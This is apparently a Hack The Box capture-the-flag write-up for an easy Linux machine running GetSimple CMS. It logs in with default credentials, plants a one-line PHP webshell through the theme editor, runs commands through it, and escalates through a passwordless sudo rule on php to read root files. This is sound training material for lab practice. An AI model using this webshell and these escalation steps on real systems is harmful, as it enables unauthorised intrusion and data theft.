
**Platform:** Hack The Box  
**Difficulty:** Easy  
**OS:** Linux

---

## Enumeration

### Nmap

Started with a full service scan to identify open ports:

```bash
nmap -sC -sV <TARGET_IP>
```

**Results:**

|Port|State|Service|Version|
|---|---|---|---|
|22|open|SSH|OpenSSH|
|80|open|HTTP|Apache|

The scan also revealed an interesting directory: `/admin`.

---

## Foothold

### Accessing the Admin Panel

Navigating to `http://<TARGET_IP>/admin` presented a login page for **GetSimple CMS 3.3.15**.

Tried the default credentials:

- **Username:** `admin`
- **Password:** `admin`

Login was successful.

### Finding a Vulnerability

Ran `searchsploit` to look for known vulnerabilities in GetSimple CMS 3.3.15:

```bash
searchsploit getsimple 3.3
```

The available exploit scripts weren't directly useful, so decided to go for a **manual PHP webshell injection** instead.

### Injecting the Webshell

GetSimple CMS allows editing theme files. Navigated to the **Innovation** theme editor and injected a classic PHP webshell at the top of the template file:

```php
<?php system($_GET['cmd']); ?>
```

Saved the file and navigated to the theme's URL with the `cmd` parameter:

```
http://<TARGET_IP>/?cmd=id
```

Command execution confirmed — the server was running as `www-data`.

---

## User Flag

Used the webshell to traverse the filesystem:

```
http://<TARGET_IP>/?cmd=ls ../../../
```

Kept navigating until locating `user.txt`, then read it:

```
http://<TARGET_IP>/?cmd=cat /home/<user>/user.txt
```

> 🚩 **user.txt** → `<flag>`

---

## Privilege Escalation

### Sudo Enumeration

Checked sudo permissions for the current user:

```
http://<TARGET_IP>/?cmd=sudo -l
```

**Output:**

```
Matching Defaults entries for www-data on gettingstarted:
    env_reset, mail_badpass, secure_path=...

User www-data may run the following commands on gettingstarted:
    (ALL : ALL) NOPASSWD: /usr/bin/php
```

`www-data` can run `/usr/bin/php` as **any user** — including root — with **no password required**.

### Exploiting the Misconfiguration

Used PHP's `file_get_contents()` to read the root flag directly:

```
http://<TARGET_IP>/?cmd=sudo /usr/bin/php -r "echo file_get_contents('/root/root.txt');"
```

> 🚩 **root.txt** → `<flag>`

---

## Summary

|Step|Detail|
|---|---|
|Recon|Nmap revealed ports 22 and 80, with a `/admin` directory|
|Access|Default credentials `admin:admin` on GetSimple CMS 3.3.15|
|Webshell|PHP cmd injection via theme editor|
|User flag|Filesystem traversal through webshell|
|PrivEsc|`sudo /usr/bin/php` with `NOPASSWD` for `www-data`|
|Root flag|`file_get_contents('/root/root.txt')` via sudo php|